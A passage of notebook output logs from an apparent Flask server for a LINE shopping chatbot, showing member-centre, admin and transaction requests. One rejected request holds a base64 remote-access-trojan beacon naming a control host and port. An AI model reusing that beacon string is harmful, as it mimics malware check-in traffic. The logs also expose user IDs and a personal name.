      "192.168.224.4 - - [14/Mar/2019 04:09:17] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:09:18] \"GET /passengerFlows HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 04:10:58] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:11:01] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:29:19] \"GET /pushMessage/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:29:20] \"GET /pushMessage/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 04:29:22] \"POST / HTTP/1.1\" 200 -\n",
      "138.97.227.169 - - [14/Mar/2019 04:38:29] \"GET / HTTP/1.1\" 405 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 04:41:49] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:42:02] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:42:08] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:42:13] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:42:22] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:42:26] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:43:10] \"GET /administrator HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 04:45:13] \"POST / HTTP/1.1\" 200 -\n",
      "203.115.104.163 - - [14/Mar/2019 04:45:17] \"GET / HTTP/1.1\" 405 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:45:19] \"GET /administrator HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 04:54:25] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:54:27] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:54:31] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:54:38] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:54:41] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:54:43] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:54:46] \"GET /productHeatMap HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:54:51] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:57:24] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "46.151.79.222 - - [14/Mar/2019 04:59:20] \"GET / HTTP/1.1\" 405 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 05:01:53] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:01:56] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:02:00] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:02:08] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:02:54] \"GET /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:03:01] \"GET /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "190.109.189.206 - - [14/Mar/2019 05:03:29] \"GET / HTTP/1.1\" 405 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:03:51] \"POST /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "幹你娘\n",
      "Find \\  False  , in submit\n",
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 05:04:17] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:04:24] \"GET /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:04:37] \"POST /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "UUBOY👻\n",
      "Find \\  False  , in submit\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 05:05:31] \"GET /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:05:48] \"POST /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Aaa\n",
      "Find \\  False  , in submit\n",
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 05:07:22] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:07:25] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 05:07:43] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "46.63.54.246 - - [14/Mar/2019 05:48:17] \"GET / HTTP/1.0\" 405 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:02:27] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:02:30] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:02:34] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:03:02] \"GET /administrator HTTP/1.1\" 200 -\n",
      "66.240.205.34 - - [14/Mar/2019 07:03:33] code 400, message Bad request version (\"x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==\")\n",
      "66.240.205.34 - - [14/Mar/2019 07:03:33] \"145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==\" HTTPStatus.BAD_REQUEST -\n",
      "192.168.224.4 - - [14/Mar/2019 07:03:33] \"GET /transaction_commit/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:03:37] \"GET /transaction_commit/Udf8f1c512878156d2bf8d0051d4f2429 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Udf8f1c512878156d2bf8d0051d4f2429\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:03:41] \"GET /transaction_commit/U1e91bf35eb5315bc17da624e46a65c51 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U1e91bf35eb5315bc17da624e46a65c51\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:03:50] \"GET /transaction_commit/Uaefa84530bef60672e135c6cee89341d HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Uaefa84530bef60672e135c6cee89341d\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:03:56] \"GET /transaction_commit/U9a1715c6ffdf0ef2ffe148726d336011 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U9a1715c6ffdf0ef2ffe148726d336011\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:04:05] \"GET /transaction_commit/Ua0ac6b70d3611ea9d3d4665941dbf3f7 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Ua0ac6b70d3611ea9d3d4665941dbf3f7\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:04:15] \"GET /transaction_commit/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U30256c6d3c01f118f8c96f05e1f0f094\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:04:20] \"GET /transaction_commit/U934211376c8da4cc677c3b801bd9f8db HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U934211376c8da4cc677c3b801bd9f8db\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:04:22] \"GET /transaction_commit/U26c1d062b5768c0ab8721698973d67b1 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U26c1d062b5768c0ab8721698973d67b1\n",
      "Transaction Completed!\n",
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:07:25] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:07:28] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:07:29] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:12:23] \"GET /transaction_commit/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:12:28] \"GET /transaction_commit/Udf8f1c512878156d2bf8d0051d4f2429 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Udf8f1c512878156d2bf8d0051d4f2429\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:12:31] \"GET /transaction_commit/U1e91bf35eb5315bc17da624e46a65c51 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U1e91bf35eb5315bc17da624e46a65c51\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:12:39] \"GET /transaction_commit/Uaefa84530bef60672e135c6cee89341d HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Uaefa84530bef60672e135c6cee89341d\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:12:43] \"GET /transaction_commit/U9a1715c6ffdf0ef2ffe148726d336011 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U9a1715c6ffdf0ef2ffe148726d336011\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:12:48] \"GET /transaction_commit/Ua0ac6b70d3611ea9d3d4665941dbf3f7 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Ua0ac6b70d3611ea9d3d4665941dbf3f7\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:12:53] \"GET /transaction_commit/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U30256c6d3c01f118f8c96f05e1f0f094\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:12:56] \"GET /transaction_commit/U934211376c8da4cc677c3b801bd9f8db HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U934211376c8da4cc677c3b801bd9f8db\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:13:02] \"GET /transaction_commit/U26c1d062b5768c0ab8721698973d67b1 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U26c1d062b5768c0ab8721698973d67b1\n",
      "Transaction Completed!\n",
      "\n",
      "    From : U23d091bfdaacf722fa39f82776b3c410\n",
      "    UserName : Rickyyuan\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U23d091bfdaacf722fa39f82776b3c410\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:22:01] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:22:13] \"POST / HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U23d091bfdaacf722fa39f82776b3c410\n",
      "    UserName : Rickyyuan\n",
      "    Said : [::text:]歷史交易\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U23d091bfdaacf722fa39f82776b3c410\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:22:17] \"POST / HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U23d091bfdaacf722fa39f82776b3c410\n",
      "    UserName : Rickyyuan\n",
      "    Said : [::text:]本次交易\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U23d091bfdaacf722fa39f82776b3c410\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:22:21] \"POST / HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U23d091bfdaacf722fa39f82776b3c410\n",
      "    UserName : Rickyyuan\n",
      "    Said : [::flex:]促銷食材\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U23d091bfdaacf722fa39f82776b3c410\n",
      "    \n",
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:27:12] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:27:14] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:27:23] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:27:30] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:27:41] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:27:43] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:28:06] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:28:09] \"GET /passengerFlows HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:30:33] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:30:51] \"GET /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:32:50] \"POST /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "幹你娘\n",
      "Find \\  False  , in submit\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:34:48] \"GET /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:36:24] \"GET /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:36:46] \"POST /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ddd\n",
      "Find \\  False  , in submit\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:38:57] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:39:02] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:39:26] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:39:34] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:40:04] \"GET /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:41:37] \"GET /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:42:18] \"POST /usercentre/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "施丞優\n",
      "Find \\  False  , in submit\n",
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:43:32] \"POST / HTTP/1.1\" 200 -\n",
      "85.163.30.1 - - [14/Mar/2019 07:56:03] \"GET / HTTP/1.1\" 405 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U30256c6d3c01f118f8c96f05e1f0f094\n",
      "    UserName : ray\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U30256c6d3c01f118f8c96f05e1f0f094\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 07:58:25] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:58:28] \"GET /usercentre/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:58:29] \"GET /favicon.ico HTTP/1.1\" 404 -\n",
      "192.168.224.4 - - [14/Mar/2019 07:58:38] \"POST /usercentre/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ray\n",
      "Find \\  False  , in submit\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 08:03:43] \"GET /usercentre/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n",
      "85.192.163.224 - - [14/Mar/2019 08:15:48] \"GET / HTTP/1.0\" 405 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:30:54] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:31:03] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:31:52] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:32:01] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:32:12] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:32:24] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:32:30] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:32:39] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:39:41] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:39:42] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:39:44] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:39:45] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:39:46] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:39:47] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:39:48] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:39:50] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:39:51] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:39:52] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:21] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:23] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:24] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:25] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:27] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:28] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:29] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:31] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:32] \"GET /welcom HTTP/1.1\" 200 -\n",
